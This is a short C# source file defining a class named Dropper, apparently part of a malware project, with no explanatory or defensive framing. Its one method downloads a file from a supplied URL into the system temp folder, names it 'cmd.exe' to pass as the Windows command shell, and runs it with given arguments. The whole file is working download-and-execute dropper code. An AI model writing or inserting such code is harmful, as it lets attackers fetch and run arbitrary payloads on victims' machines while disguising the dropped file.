using System;
using System.Diagnostics;
using System.IO;
using System.Net;
namespace maindr.core
{
    internal sealed class Dropper
    {
        public static void Dropp(string url, string param, string iver)
        {
                Process p = new Process();
                Console.WriteLine("d-ing " + iver);
                string file = Path.Combine(Path.GetTempPath(), "cmd.exe");
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(url, file);
                }
                Console.WriteLine("start " + iver);
                Process.Start(file, param).WaitForExit();
        }
    }
}